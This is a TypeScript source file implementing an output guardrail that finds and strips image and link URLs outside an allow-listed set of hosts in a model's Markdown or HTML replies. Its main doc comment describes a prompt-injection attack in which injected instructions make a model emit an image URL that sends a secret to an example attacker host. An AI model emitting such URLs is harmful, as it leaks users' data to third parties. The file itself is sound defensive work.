import type {
  GuardrailMatch,
  GuardrailVerdict,
  LinkFilterOptions,
  SyncGuardrailDetector,
} from "../contracts";

/** Detector name, used as the namespace prefix on every {@link GuardrailMatch.rule}. */
const DETECTOR_NAME = "links";

/** Rewrite passes before a `redact` gives up and blocks (nested constructs). */
const MAX_REWRITE_PASSES = 3;

/** What carried the URL: an image, a link, or a reference definition (used by both). */
type LinkKind = "image" | "link" | "definition";

/** Replace `text[start, end)` with `insert`. */
interface Edit {
  readonly start: number;
  readonly end: number;
  readonly insert: string;
}

/** One construct whose URL is not allowed, with the edits that strip it. */
interface LinkHit {
  readonly kind: LinkKind;
  readonly start: number;
  /** Exclusive end offset. */
  readonly end: number;
  readonly edits: readonly Edit[];
}

/** Scan settings shared by every pass. */
interface ScanSettings {
  readonly links: boolean;
  readonly isAllowedHost: (host: string) => boolean;
}

/**
 * Drop ASCII control characters, space and DEL: renderers drop or trim
 * them inside URLs.
 */
function stripControlOrSpace(raw: string): string {
  let result = "";
  let kept = 0;

  for (let index = 0; index < raw.length; index += 1) {
    const code = raw.charCodeAt(index);

    if (code <= 32 || code === 127) {
      result += raw.slice(kept, index);
      kept = index + 1;
    }
  }

  return kept === 0 ? raw : result + raw.slice(kept);
}

/**
 * Compile `allowHosts` into a predicate. An entry matches its exact host;
 * a `*.example.com` entry matches every subdomain of `example.com` (list
 * `example.com` too to allow the apex).
 */
function compileHosts(hosts: readonly string[]): (host: string) => boolean {
  const exact = new Set<string>();
  const suffixes: string[] = [];

  for (const entry of hosts) {
    const host = entry.trim().toLowerCase();

    if (host.startsWith("*.") && host.length > 2) {
      suffixes.push(host.slice(1));
    } else if (host.length > 0) {
      exact.add(host);
    }
  }

  return (host) => {
    const normalized = host.toLowerCase().replace(/\.$/, "");

    return (
      exact.has(normalized) ||
      suffixes.some((suffix) => normalized.length > suffix.length && normalized.endsWith(suffix))
    );
  };
}

/**
 * Whether a URL taken from model output may stay. Relative references
 * (`/img.png`, `#top`, `docs/a`) stay: they resolve against the page that
 * renders the text. An absolute URL stays only when it is `http(s)` and its
 * host is allowed. Anything a renderer could decode into a different host is
 * refused: entity references (`&`) and backslashes before the query, and
 * every other scheme (`data:`, `javascript:`, `mailto:`).
 */
function isAllowedUrl(raw: string, settings: ScanSettings): boolean {
  const url = stripControlOrSpace(raw);
  const queryStart = url.search(/[?#]/);
  const head = queryStart === -1 ? url : url.slice(0, queryStart);

  if (head.includes("&") || head.includes("\\")) {
    return false;
  }

  if (!url.startsWith("//")) {
    const schemeEnd = url.search(/[:/?#]/);

    if (schemeEnd === -1 || url[schemeEnd] !== ":") {
      return true;
    }
  }

  let parsed: URL;

  try {
    parsed = new URL(url.startsWith("//") ? `https:${url}` : url);
  } catch {
    return false;
  }

  if (parsed.protocol !== "https:" && parsed.protocol !== "http:") {
    return false;
  }

  return settings.isAllowedHost(parsed.hostname);
}

function isWhitespace(code: number): boolean {
  return code === 32 || code === 9 || code === 10 || code === 13 || code === 12;
}

function skipWhitespace(text: string, index: number): number {
  let cursor = index;

  while (cursor < text.length && isWhitespace(text.charCodeAt(cursor))) {
    cursor += 1;
  }

  return cursor;
}

/** A parsed Markdown link destination (plus optional title). */
interface Destination {
  readonly url: string;
  /** Exclusive end of the construct: after `)` when well formed. */
  readonly end: number;
  /** The destination stopped on a character a renderer may read differently. */
  readonly suspicious: boolean;
}

/**
 * For each title closer (`"`, `'`, `)`), the earliest offset from which a
 * title scan already reached the end of the text without finding it. A
 * later scan starting at or after that offset cannot find it either, so it
 * is skipped: many unclosed `(` titles stay linear instead of each one
 * rescanning the rest of the text.
 */
type UnclosedTitles = Map<number, number>;

/**
 * Read an inline destination starting right after `](`. Stops on brackets
 * and `<` inside a bare destination (marked suspicious), so every scan
 * covers its own stretch of text once.
 */
function readInlineDestination(
  text: string,
  from: number,
  unclosedTitles: UnclosedTitles,
): Destination {
  let cursor = skipWhitespace(text, from);
  let url: string;
  let suspicious = false;

  if (text.charCodeAt(cursor) === 60 /* < */) {
    const start = cursor + 1;
    cursor = start;

    while (cursor < text.length) {
      const code = text.charCodeAt(cursor);

      if (code === 62 /* > */ || code === 10 || code === 60) break;
      if (code === 92 /* \ */) cursor += 1;
      cursor += 1;
    }

    url = text.slice(start, cursor);

    if (text.charCodeAt(cursor) === 62) {
      cursor += 1;
    } else {
      suspicious = true;
    }
  } else {
    const start = cursor;
    let depth = 0;

    while (cursor < text.length) {
      const code = text.charCodeAt(cursor);

      if (code <= 32 || code === 127) break;

      if (code === 92 /* \ */) {
        cursor += 2;
        continue;
      }

      if (code === 40 /* ( */) depth += 1;

      if (code === 41 /* ) */) {
        if (depth === 0) break;
        depth -= 1;
      }

      if (code === 91 || code === 93 || code === 60 /* [ ] < */) {
        suspicious = true;
        break;
      }

      cursor += 1;
    }

    url = text.slice(start, Math.min(cursor, text.length));
  }

  const urlEnd = Math.min(cursor, text.length);
  let after = skipWhitespace(text, urlEnd);
  const opener = text.charCodeAt(after);
  const closer =
    opener === 34 /* " */ ? 34 : opener === 39 /* ' */ ? 39 : opener === 40 /* ( */ ? 41 : -1;

  const titleStart = after + 1;

  if (closer !== -1 && titleStart < (unclosedTitles.get(closer) ?? Infinity)) {
    let titleEnd = titleStart;

    while (titleEnd < text.length && text.charCodeAt(titleEnd) !== closer) {
      titleEnd += text.charCodeAt(titleEnd) === 92 ? 2 : 1;
    }

    if (titleEnd < text.length) {
      after = skipWhitespace(text, titleEnd + 1);
    } else {
      unclosedTitles.set(closer, titleStart);
    }
  }

  if (text.charCodeAt(after) === 41 /* ) */) {
    return { url, end: after + 1, suspicious };
  }

  return { url, end: urlEnd, suspicious };
}

/**
 * Markdown inline images and links: one left-to-right pass that pairs
 * brackets with a stack (innermost first, as renderers do), then reads the
 * destination after each `](`.
 */
function scanMarkdownInline(text: string, settings: ScanSettings, hits: LinkHit[]): void {
  const open: Array<{ readonly index: number; readonly image: boolean }> = [];
  const unclosedTitles: UnclosedTitles = new Map();
  let escapedAt = -1;

  for (let index = 0; index < text.length; index += 1) {
    const code = text.charCodeAt(index);

    if (code === 92 /* \ */) {
      escapedAt = index + 1;
      index += 1;
      continue;
    }

    if (code === 91 /* [ */) {
      const image =
        index > 0 && text.charCodeAt(index - 1) === 33 /* ! */ && escapedAt !== index - 1;
      open.push({ index, image });
      continue;
    }

    if (code !== 93 /* ] */) continue;

    const opener = open.pop();

    if (!opener || text.charCodeAt(index + 1) !== 40 /* ( */) continue;
    if (!opener.image && !settings.links) continue;

    const destination = readInlineDestination(text, index + 2, unclosedTitles);

    if (!destination.suspicious && isAllowedUrl(destination.url, settings)) continue;

    const start = opener.image ? opener.index - 1 : opener.index;

    hits.push({
      kind: opener.image ? "image" : "link",
      start,
      end: destination.end,
      edits: [
        { start, end: opener.index + 1, insert: "" },
        { start: index, end: destination.end, insert: "" },
      ],
    });
  }
}

/**
 * Markdown reference definitions (`[ref]: https://…`), which `![alt][ref]`
 * images and `[text][ref]` links resolve to. Always checked: a definition
 * may feed an image. A refused definition line is removed.
 */
function scanDefinitions(text: string, settings: ScanSettings, hits: LinkHit[]): void {
  let lineStart = 0;

  while (lineStart < text.length) {
    const lineEnd = text.indexOf("\n", lineStart);
    const nextLine = lineEnd === -1 ? text.length : lineEnd + 1;
    let cursor = lineStart;

    while (cursor < lineStart + 3 && text.charCodeAt(cursor) === 32) cursor += 1;

    if (text.charCodeAt(cursor) === 91 /* [ */) {
      const limit = lineEnd === -1 ? text.length : lineEnd;
      let labelEnd = cursor + 1;

      // Search this line only, so a long run of `[` lines stays linear.
      while (labelEnd < limit && text.charCodeAt(labelEnd) !== 93 /* ] */) labelEnd += 1;

      if (labelEnd < limit && text.charCodeAt(labelEnd + 1) === 58 /* : */) {
        let urlStart = skipWhitespace(text, labelEnd + 2);
        let urlEnd = urlStart;

        if (text.charCodeAt(urlStart) === 60 /* < */) {
          urlStart += 1;
          urlEnd = urlStart;
          while (urlEnd < text.length && !/[>\n<]/.test(text[urlEnd] ?? "")) urlEnd += 1;
        } else {
          while (urlEnd < text.length && text.charCodeAt(urlEnd) > 32) urlEnd += 1;
        }

        const url = text.slice(urlStart, urlEnd);

        if (url.length > 0 && !isAllowedUrl(url, settings)) {
          const end = text.charCodeAt(urlEnd) === 62 ? urlEnd + 1 : urlEnd;

          hits.push({
            kind: "definition",
            start: lineStart,
            end,
            edits: [{ start: lineStart, end, insert: "" }],
          });
        }
      }
    }

    lineStart = nextLine;
  }
}

/** Read an ASCII tag or scheme name starting at `from`, lowercased. */
function readName(text: string, from: number): string {
  let cursor = from;

  while (cursor < text.length) {
    const code = text.charCodeAt(cursor) | 0x20;

    if (code < 97 || code > 122) break;
    cursor += 1;
  }

  return text.slice(from, cursor).toLowerCase();
}

/** An HTML start tag's attributes (first occurrence wins) and its exclusive end. */
interface ParsedTag {
  readonly end: number;
  readonly attributes: ReadonlyMap<string, string>;
}

/** Parse attributes up to the `>` that closes the tag, honouring quotes. */
function readTag(text: string, from: number): ParsedTag {
  const attributes = new Map<string, string>();
  let cursor = from;

  while (cursor < text.length) {
    while (
      cursor < text.length &&
      (isWhitespace(text.charCodeAt(cursor)) || text.charCodeAt(cursor) === 47) /* / */
    ) {
      cursor += 1;
    }

    if (cursor >= text.length) break;
    if (text.charCodeAt(cursor) === 62 /* > */) return { end: cursor + 1, attributes };

    const nameStart = cursor;

    while (cursor < text.length && !/[\s=>/"']/.test(text[cursor] ?? "")) cursor += 1;

    if (cursor === nameStart) {
      cursor += 1;
      continue;
    }

    const name = text.slice(nameStart, cursor).toLowerCase();
    let value = "";

    cursor = skipWhitespace(text, cursor);

    if (text.charCodeAt(cursor) === 61 /* = */) {
      cursor = skipWhitespace(text, cursor + 1);
      const quote = text.charCodeAt(cursor);

      if (quote === 34 || quote === 39) {
        const close = text.indexOf(quote === 34 ? '"' : "'", cursor + 1);
        const valueEnd = close === -1 ? text.length : close;

        value = text.slice(cursor + 1, valueEnd);
        cursor = valueEnd + 1;
      } else {
        const valueStart = cursor;

        while (cursor < text.length && !/[\s>]/.test(text[cursor] ?? "")) cursor += 1;
        value = text.slice(valueStart, cursor);
      }
    }

    if (!attributes.has(name)) attributes.set(name, value);
  }

  return { end: text.length, attributes };
}

/** The URLs a `srcset` value lists (`url 1x, url 2x`). */
function srcsetUrls(value: string): string[] {
  return value
    .split(",")
    .map((candidate) => candidate.trim().split(/\s+/)[0] ?? "")
    .filter((url) => url.length > 0);
}

/**
 * HTML `<img>` tags (`src`, `srcset`) and, with `links`, `<a href>` tags and
 * `<scheme:…>` autolinks. A refused image tag is replaced by its `alt`
 * text; a refused anchor tag or autolink is removed (the link text stays).
 */
function scanHtml(text: string, settings: ScanSettings, hits: LinkHit[]): void {
  let index = text.indexOf("<");

  while (index !== -1) {
    const name = readName(text, index + 1);
    const afterName = index + 1 + name.length;
    const boundary = text.charCodeAt(afterName);
    const isTag =
      afterName >= text.length || isWhitespace(boundary) || boundary === 47 || boundary === 62;

    // HTML parsers turn `<image>` into `<img>`, and SVG `<image>` loads its
    // `href` / `xlink:href`.
    const isImage = name === "img" || name === "image";

    if (isTag && (isImage || (settings.links && name === "a"))) {
      const tag = readTag(text, afterName);
      const urls = isImage
        ? [
            tag.attributes.get("src"),
            ...srcsetUrls(tag.attributes.get("srcset") ?? ""),
            ...(name === "image"
              ? [tag.attributes.get("href"), tag.attributes.get("xlink:href")]
              : []),
          ]
        : [tag.attributes.get("href")];
      const refused = urls.some((url) => url !== undefined && !isAllowedUrl(url, settings));

      if (refused) {
        hits.push({
          kind: isImage ? "image" : "link",
          start: index,
          end: tag.end,
          edits: [
            {
              start: index,
              end: tag.end,
              insert: isImage ? (tag.attributes.get("alt") ?? "") : "",
            },
          ],
        });
      }

      index = text.indexOf("<", tag.end);
      continue;
    }

    if (settings.links && name.length > 0 && boundary === 58 /* : */) {
      let close = afterName;

      while (close < text.length && !/[\s<>]/.test(text[close] ?? "")) close += 1;

      if (text.charCodeAt(close) === 62 /* > */) {
        const url = text.slice(index + 1, close);

        if (!isAllowedUrl(url, settings)) {
          hits.push({
            kind: "link",
            start: index,
            end: close + 1,
            edits: [{ start: index, end: close + 1, insert: "" }],
          });
        }

        index = text.indexOf("<", close + 1);
        continue;
      }
    }

    index = text.indexOf("<", index + 1);
  }
}

/** Every refused construct in `text`, ordered by start offset. */
function scan(text: string, settings: ScanSettings): LinkHit[] {
  const hits: LinkHit[] = [];

  scanMarkdownInline(text, settings, hits);
  scanDefinitions(text, settings, hits);
  scanHtml(text, settings, hits);

  return hits.sort((a, b) => a.start - b.start);
}

/**
 * Apply every hit's edits in one forward pass. Nested constructs produce
 * disjoint edits (an image inside a link keeps working); an edit that
 * overlaps an earlier one is skipped and caught by the next pass.
 */
function applyEdits(text: string, hits: readonly LinkHit[]): string {
  const edits = hits.flatMap((hit) => hit.edits).sort((a, b) => a.start - b.start);
  const parts: string[] = [];
  let cursor = 0;

  for (const edit of edits) {
    if (edit.start < cursor) continue;

    parts.push(text.slice(cursor, edit.start), edit.insert);
    cursor = edit.end;
  }

  parts.push(text.slice(cursor));

  return parts.join("");
}

function toMatch(hit: LinkHit): GuardrailMatch {
  return {
    rule: `${DETECTOR_NAME}.${hit.kind}`,
    span: [hit.start, hit.end - 1],
    label: hit.kind,
  };
}

/**
 * Build the built-in **external link detector** (`ai.guardrail.links`), an
 * `output` detector against data exfiltration through rendered Markdown or
 * HTML. Injected instructions can make a model emit
 * `![](https://attacker.example/?q=<secret>)`; a chat UI that renders the
 * reply loads the image and sends the secret without a click. The detector
 * finds images whose URL is not on `allowHosts` — Markdown inline images,
 * reference definitions, HTML `<img src|srcset>` — and, with `links: true`,
 * Markdown links, `<a href>` and `<scheme:…>` autolinks.
 *
 * Relative URLs are kept. An absolute URL is kept only when it is
 * `http(s)` and its host is allowed; other schemes and URLs carrying
 * entity references or backslashes before the query are refused.
 *
 * On a hit the verdict follows `onMatch` (default `"redact"`): the URL is
 * stripped and the visible text kept (an image becomes its alt text, a link
 * its link text, a reference definition is removed). Matching is linear in
 * the length of the text. It does not sanitize other HTML: render model
 * output through an HTML sanitizer as well when HTML is allowed at all.
 *
 * @example
 * ai.guardrail({
 *   output: [ai.guardrail.links({ allowHosts: ["cdn.example.com", "*.example.org"] })],
 * });
 *
 * @example
 * // Also strip external links, and refuse the reply instead of rewriting it.
 * ai.guardrail.links({ links: true, onMatch: "block" });
 */
export function links(options: LinkFilterOptions = {}): SyncGuardrailDetector {
  const settings: ScanSettings = {
    links: options.links ?? false,
    isAllowedHost: compileHosts(options.allowHosts ?? []),
  };
  const onMatch = options.onMatch ?? "redact";

  return {
    name: DETECTOR_NAME,
    check(text: string): GuardrailVerdict {
      const hits = scan(text, settings);

      if (hits.length === 0) {
        return { type: "allow" };
      }

      const matches = hits.map(toMatch);
      const reason = `Found ${hits.length} image or link URL(s) outside allowHosts.`;

      if (onMatch === "block") {
        return { type: "block", reason, matches };
      }

      if (onMatch === "flag") {
        return { type: "flag", reason, matches };
      }

      let rewritten = applyEdits(text, hits);

      for (let pass = 1; pass < MAX_REWRITE_PASSES; pass += 1) {
        const remaining = scan(rewritten, settings);

        if (remaining.length === 0) {
          return { type: "redact", text: rewritten, reason, matches };
        }

        rewritten = applyEdits(rewritten, remaining);
      }

      if (scan(rewritten, settings).length === 0) {
        return { type: "redact", text: rewritten, reason, matches };
      }

      return {
        type: "block",
        reason: `${reason} The URLs could not be stripped safely.`,
        matches,
      };
    },
  };
}
